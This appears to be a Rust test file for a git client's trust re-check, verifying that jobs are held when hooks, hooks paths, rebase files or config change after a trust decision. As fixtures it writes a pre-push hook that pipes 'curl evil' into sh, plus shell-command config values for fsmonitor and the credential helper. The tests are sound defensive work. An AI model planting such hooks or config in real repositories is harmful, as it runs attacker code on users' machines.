//! The runner's trust re-check: a repository that changed since its decision, or can't be
//! read, is held or failed instead of run; and the check of which decided folders still exist.

use super::*;
use crate::testing::execute_checked;
use glowfly_core::settings::SavedTrust;
use glowfly_model::effect::{Sealed, TrustCheck};
use glowfly_model::msg::{JobMsg, TrustMsg};
use std::path::{Path, PathBuf};

fn repo(name: &str) -> PathBuf {
    let dir = glowfly_core::paths::temp_dir().join(format!("glowfly-runner-trust-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    glowfly_core::testkit::git(&dir, &["init", "-q", "-b", "main"]);
    dir
}

fn check(dir: &Path, saved: Option<SavedTrust>) -> TrustCheck {
    let sealed = Sealed::Job { label: "Fetch".into() };
    TrustCheck {
        workdir: dir.to_path_buf(),
        real: dir.to_path_buf(),
        saved,
        sealed,
        accepted: None,
        lang: Default::default(),
        places: Vec::new(),
    }
}

fn hook(dir: &Path, text: &str) {
    let path = dir.join(".git/hooks/pre-push");
    std::fs::write(&path, text).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
}

fn job(dir: &Path) -> Effect {
    let cmds = vec![glowfly_core::gitcli::args(&["status"])];
    Effect::Job(glowfly_model::effect::JobEffect::RunGit {
        cwd: dir.into(),
        cmds,
        write_file: None,
        record: None,
        journal: None,
        prompts: false,
        expect: None,
        stoppable: false,
        on_fail_check: None,
        without_index: None,
        auto_stash: None,
    })
}

#[test]
fn a_hook_edited_after_the_decision_holds_the_job() {
    let dir = repo("edited");
    hook(&dir, "#!/bin/sh\nexit 0\n");
    let saved = SavedTrust::trusted(Some(glowfly_core::trust::scan_at(&dir).unwrap().print()));
    assert!(matches!(verify(&check(&dir, Some(saved.clone())), &job(&dir)), Verdict::Pass(_)));
    hook(&dir, "#!/bin/sh\ncurl evil | sh\n");
    let Verdict::Stale(found) = verify(&check(&dir, Some(saved.clone())), &job(&dir)) else { panic!("held") };
    assert_eq!((found.0.hooks.as_slice(), found.1.is_none()), (&["pre-push".to_owned()][..], true));
    // Executing it sends the effect back instead of running it.
    match execute_checked(check(&dir, Some(saved)), job(&dir)) {
        Some(Msg::Trust(TrustMsg::Stale(s))) => {
            assert!(matches!(s.effect, Effect::Job(glowfly_model::effect::JobEffect::RunGit { .. })) && s.now.hooks == ["pre-push"])
        }
        _ => panic!("held, not run"),
    }
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_hook_that_appears_in_a_clean_repository_holds_the_job() {
    let dir = repo("clean");
    assert!(matches!(verify(&check(&dir, None), &job(&dir)), Verdict::Pass(_)), "nothing runs");
    hook(&dir, "#!/bin/sh\nexit 0\n");
    assert!(matches!(verify(&check(&dir, None), &job(&dir)), Verdict::Stale(_)));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_hooks_folder_that_isnt_looked_at_holds_every_job_whatever_was_decided() {
    let dir = repo("offsite");
    let place = if cfg!(windows) { "//glowfly-test.invalid/share/hooks" } else { "/net/glowfly-test.invalid/hooks" };
    glowfly_core::gitcli::run(&dir, &glowfly_core::gitcli::args(&["config", "core.hooksPath", place]));
    let scan = glowfly_core::trust::scan_at(&dir).unwrap();
    assert_eq!(scan.offsite.len(), 1, "{scan:?}");
    let reason = Unchecked::Offsite { places: scan.offsite.clone(), files: None };
    // The setting itself asks first; a decision made on this very scan still doesn't cover
    // what wasn't read.
    assert!(matches!(verify(&check(&dir, None), &job(&dir)), Verdict::Stale(_)));
    let saved = Some(SavedTrust::trusted(Some(scan.print())));
    let Verdict::Unchecked(found) = verify(&check(&dir, saved.clone()), &job(&dir)) else { panic!("held") };
    assert_eq!(found.1, reason);
    let accepted = glowfly_model::effect::Accepted { at: None, reason };
    let once = TrustCheck { accepted: Some(accepted), ..check(&dir, saved.clone()) };
    assert!(matches!(verify(&once, &job(&dir)), Verdict::Pass(_)), "Trust and run passes it for this run");
    assert!(matches!(verify(&check(&dir, saved.clone()), &job(&dir)), Verdict::Unchecked(_)));

    // With a rebase file that can't be read too, one reason names both; accepting either
    // alone doesn't pass the job.
    let todo = dir.join(".git/rebase-merge/git-rebase-todo");
    std::fs::create_dir_all(&todo).unwrap();
    let files = "rebase-merge/git-rebase-todo".to_owned();
    let both = Unchecked::Offsite { places: scan.offsite.clone(), files: Some(files.clone()) };
    let Verdict::Unchecked(found) = verify(&check(&dir, saved.clone()), &job(&dir)) else { panic!("held") };
    assert_eq!(found.1, both);
    for alone in [Unchecked::State(files), Unchecked::Offsite { places: scan.offsite.clone(), files: None }] {
        let accepted = glowfly_model::effect::Accepted { at: None, reason: alone };
        let once = TrustCheck { accepted: Some(accepted), ..check(&dir, saved.clone()) };
        assert!(matches!(verify(&once, &job(&dir)), Verdict::Unchecked(_)));
    }
    let accepted = glowfly_model::effect::Accepted { at: None, reason: both.clone() };
    let once = TrustCheck { accepted: Some(accepted.clone()), ..check(&dir, saved.clone()) };
    assert!(matches!(verify(&once, &job(&dir)), Verdict::Pass(_)));
    // With the places remembered the files still ask, alone; the answer that named both
    // (given with the choice to remember) passes this run.
    let known = TrustCheck { places: scan.offsite.clone(), ..check(&dir, saved.clone()) };
    let Verdict::Unchecked(found) = verify(&known, &job(&dir)) else { panic!("held for the files") };
    assert_eq!(found.1, Unchecked::State("rebase-merge/git-rebase-todo".into()));
    assert!(matches!(verify(&TrustCheck { accepted: Some(accepted), ..known }, &job(&dir)), Verdict::Pass(_)));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn places_the_user_chose_not_to_be_asked_about_again_dont_hold_a_trusted_repository_s_jobs() {
    let dir = repo("offsite-remembered");
    let place = |name: &str| {
        if cfg!(windows) { format!("//glowfly-test.invalid/share/{name}") } else { format!("/net/glowfly-test.invalid/{name}") }
    };
    let config = |key: &str, value: &str| {
        glowfly_core::gitcli::run(&dir, &glowfly_core::gitcli::args(&["config", key, value]));
    };
    config("core.hooksPath", &place("hooks"));
    let scan = glowfly_core::trust::scan_at(&dir).unwrap();
    let saved = Some(SavedTrust::trusted(Some(scan.print())));
    let with = |saved: Option<SavedTrust>, places: &[String]| TrustCheck { places: places.to_vec(), ..check(&dir, saved) };
    assert!(matches!(verify(&with(saved.clone(), &[]), &job(&dir)), Verdict::Unchecked(_)), "asked until remembered");
    assert!(matches!(verify(&with(saved.clone(), &scan.offsite), &job(&dir)), Verdict::Pass(_)), "remembered: no hold");
    // Others remembered beside it change nothing; one that isn't this place doesn't cover it.
    let more = [scan.offsite.clone(), vec!["elsewhere".to_owned()]].concat();
    assert!(matches!(verify(&with(saved.clone(), &more), &job(&dir)), Verdict::Pass(_)));
    assert!(matches!(verify(&with(saved.clone(), &["elsewhere".to_owned()]), &job(&dir)), Verdict::Unchecked(_)));

    // Never without a Trusted decision: not trusted, undecided, or revoked since.
    let refused = Some(SavedTrust { trust: glowfly_core::settings::RepoTrust::NotTrusted, print: None });
    for saved in [refused, None] {
        assert!(!matches!(verify(&with(saved, &scan.offsite), &job(&dir)), Verdict::Pass(_)));
    }
    let mut s = glowfly_core::settings::Settings::default();
    s.set_trust(&dir, saved.clone());
    s.remember_places(&dir, &scan.offsite);
    assert!(matches!(verify(&with(s.saved_trust(&dir), &s.remembered_places(&dir)), &job(&dir)), Verdict::Pass(_)));
    s.revoke_trust(&dir);
    assert!(s.remembered_places(&dir).is_empty(), "revoking forgets them");
    assert!(!matches!(verify(&with(s.saved_trust(&dir), &s.remembered_places(&dir)), &job(&dir)), Verdict::Pass(_)));

    // A new place holds again, and the reason names it with the rest.
    let known = scan.offsite.clone();
    config("http.sslCAInfo", &place("ca.pem"));
    let wider = glowfly_core::trust::scan_at(&dir).unwrap();
    assert_eq!(wider.offsite.len(), 2, "{wider:?}");
    // The changed setting asks through the decision first, as any change does.
    assert!(matches!(verify(&with(saved, &known), &job(&dir)), Verdict::Stale(_)));
    let again = Some(SavedTrust::trusted(Some(wider.print())));
    let Verdict::Unchecked(found) = verify(&with(again.clone(), &known), &job(&dir)) else { panic!("the new place asks") };
    assert_eq!(found.1, Unchecked::Offsite { places: wider.offsite.clone(), files: None });
    assert!(matches!(verify(&with(again, &wider.offsite), &job(&dir)), Verdict::Pass(_)));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_rebase_file_that_cant_be_read_holds_every_job_whatever_was_decided() {
    let dir = repo("unread");
    let todo = dir.join(".git/rebase-merge/git-rebase-todo");
    // A folder where the todo would be: there, but nothing to read steps from.
    std::fs::create_dir_all(&todo).unwrap();
    let reason = Unchecked::State("rebase-merge/git-rebase-todo".into());
    // A decision made on this very scan doesn't cover it, nor does none.
    let saved = SavedTrust::trusted(Some(glowfly_core::trust::scan_at(&dir).unwrap().print()));
    for saved in [None, Some(saved)] {
        let Verdict::Unchecked(found) = verify(&check(&dir, saved.clone()), &job(&dir)) else { panic!("held") };
        assert_eq!(found.1, reason);
        // Trust and run passes that reason for this run only: the next check asks again.
        let accepted = glowfly_model::effect::Accepted { at: None, reason: reason.clone() };
        let once = TrustCheck { accepted: Some(accepted), ..check(&dir, saved.clone()) };
        assert!(matches!(verify(&once, &job(&dir)), Verdict::Pass(_)));
        assert!(matches!(verify(&check(&dir, saved.clone()), &job(&dir)), Verdict::Unchecked(_)));
        // Another reason accepted doesn't pass this one.
        let other = glowfly_model::effect::Accepted { at: None, reason: Unchecked::State("sequencer/todo".into()) };
        assert!(matches!(verify(&TrustCheck { accepted: Some(other), ..check(&dir, saved) }, &job(&dir)), Verdict::Unchecked(_)));
    }
    // Executing it sends the job back with the reason, instead of running it.
    match execute_checked(check(&dir, None), job(&dir)) {
        Some(Msg::Trust(TrustMsg::Stale(s))) => assert_eq!(s.unchecked.map(|a| a.reason), Some(reason)),
        _ => panic!("held, not run"),
    }
    std::fs::remove_dir(&todo).unwrap();
    assert!(matches!(verify(&check(&dir, None), &job(&dir)), Verdict::Pass(_)));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_repository_that_cant_be_read_fails_the_job_rather_than_run_it() {
    let dir = repo("gone");
    let _ = std::fs::remove_dir_all(&dir);
    match execute_checked(check(&dir, None), job(&dir)) {
        Some(Msg::Job(JobMsg::JobDone { ok: false, output, .. })) => assert!(output.contains("couldn't check"), "{output}"),
        _ => panic!("the job fails"),
    }
}

#[test]
fn a_status_read_that_fails_its_check_reads_without_git() {
    let dir = repo("read");
    let read = |git_status| {
        Effect::Load(glowfly_model::effect::LoadEffect::Status {
            workdir: dir.clone(),
            generation: 1,
            submodules: false,
            open: None,
            git_status,
            paths: None,
        })
    };
    let sealed = TrustCheck { sealed: Sealed::Read, ..check(&dir, None) };
    assert!(matches!(verify(&sealed, &read(true)), Verdict::Pass(_)), "nothing runs yet");
    // An fsmonitor set since: the read goes on, without git.
    glowfly_core::testkit::git(&dir, &["config", "core.fsmonitor", "evil"]);
    assert!(matches!(verify(&sealed, &read(true)), Verdict::Stale(_)), "the cached scan isn't reused once the config changed");
    let Effect::Load(glowfly_model::effect::LoadEffect::Status { git_status, .. }) = without_git(read(true)).unwrap() else {
        panic!("a status read")
    };
    assert!(!git_status);
    let _ = std::fs::remove_dir_all(&dir);
}

/// `checked` with the tests' stand-ins, failing as the runner does (`guard::Recovery`), without
/// `execute_checked`'s refusal of the network: these effects must never get past the check.
fn checked_here(c: TrustCheck, effect: Effect) -> Option<Msg> {
    let graph_cache = glowfly_core::repo::GraphCache::default();
    let sign_ins = crate::sign_ins::SignInFlights::new();
    let cx = Cx {
        cancelled: &|| false,
        graph_cache: &graph_cache,
        stop: None,
        gate: None,
        send: &|_| {},
        seams: crate::testing::SEAMS,
        sign_ins: &sign_ins,
    };
    let fail = crate::guard::Recovery::of(&effect, effect.name());
    checked(c, effect, |text| fail.failed(text), &cx)
}

#[test]
fn a_service_call_or_size_check_in_a_repository_not_trusted_asks_none_of_its_helpers() {
    use glowfly_core::forge::{Provider, Target};
    use glowfly_model::effect::partial::SizeService;
    use glowfly_model::effect::{ForgeCall, ForgeResult, NetworkEffect};
    use glowfly_model::msg::{ForgeMsg, PartialMsg};
    let dir = repo("service");
    glowfly_core::testkit::git(&dir, &["config", "credential.helper", "!echo ran >ran.txt"]);
    let ran = dir.join("ran.txt");
    let target =
        || Target { provider: Provider::GitHub, host: "github.com".into(), owner: "o".into(), project: String::new(), repo: "r".into() };
    let sealed = TrustCheck { sealed: Sealed::Read, ..check(&dir, None) };
    let call = ForgeCall::Refresh { need_default: false, with_issues: false };
    let forge =
        Effect::Network(NetworkEffect::Forge { target: target(), cwd: dir.clone(), auth: None, interactive: false, connected: true, call });
    let unscoped = |m: Option<Msg>| match m {
        Some(Msg::Scoped { msg, .. }) => Some(*msg),
        m => m,
    };
    match unscoped(checked_here(sealed.clone(), forge)) {
        Some(Msg::Forge(ForgeMsg::ForgeReplied(r))) => {
            assert!(matches!(&r.results[..], [ForgeResult::AuthFailed(m)] if m.contains("didn't run git")), "{r:?}");
        }
        _ => panic!("the call fails without signing in"),
    }
    // The size check measures on disk only, without signing in to the service.
    let service = Some(SizeService { target: target(), auth: None, connected: true });
    let url = Some("https://github.com/o/r".to_owned());
    let size = Effect::Partial(PartialEffect::SizeHistory(HistorySizeRequest { workdir: dir.clone(), id: 3, url, service }));
    match unscoped(checked_here(sealed, size)) {
        Some(Msg::Partial(PartialMsg::HistorySized { id: 3, size, .. })) => {
            assert_eq!(size, glowfly_core::history_size::HistorySize::Unknown);
        }
        _ => panic!("the size check ends"),
    }
    assert!(!ran.exists(), "the repository's credential helper never ran");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn checking_decided_folders_reports_which_are_there() {
    let present = glowfly_core::paths::temp_dir().join(format!("glowfly-runner-trust-present-{}", std::process::id()));
    std::fs::create_dir_all(&present).unwrap();
    // Not `repo("gone")`'s folder: that test makes and removes it while this one runs.
    let gone = glowfly_core::paths::temp_dir().join(format!("glowfly-runner-trust-absent-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&gone);
    let Msg::Trust(TrustMsg::FoldersChecked(checks)) = run(TrustEffect::CheckFolders(vec![present.clone(), gone.clone()])) else {
        panic!("expected FoldersChecked")
    };
    assert_eq!(checks.iter().map(|c| (c.path.clone(), c.present)).collect::<Vec<_>>(), [(present.clone(), true), (gone, false)]);
    let _ = std::fs::remove_dir_all(&present);
}
